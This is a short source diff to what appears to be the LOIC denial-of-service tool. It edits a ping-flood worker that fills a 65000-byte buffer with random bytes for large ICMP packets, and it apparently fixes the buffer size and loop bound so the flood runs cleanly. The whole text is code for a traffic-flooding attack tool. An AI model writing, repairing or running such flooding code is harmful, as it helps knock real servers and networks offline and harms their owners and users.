@@ -555,7 +555,7 @@ namespace LOIC
            this._PingsPerThread = PingsPerThread;
            this._pingSender = new Ping();
            this._RandomMessage = RandomMessage;
-           this._BytesToSend = new byte[64999];
+           this._BytesToSend = new byte[65000];
            this._random = new Random();
            _opt = new PingOptions();
            _opt.DontFragment = false;
@@ -593,9 +593,11 @@ namespace LOIC
         private  void bw_DoWork (object sender, EventArgs e){
              
             //fill an array with 65499 random bytes bytes 
-            for(int b = 0; b < 65499; b++){
-               
-              this._BytesToSend[b] = Convert.ToByte(this._random.Next(0,255));
+            int b = 0;
+            while (b < 64999)
+            {
+                this._BytesToSend[b] = Convert.ToByte(this._random.Next(0, 255));
+                b++;
             }
         
             
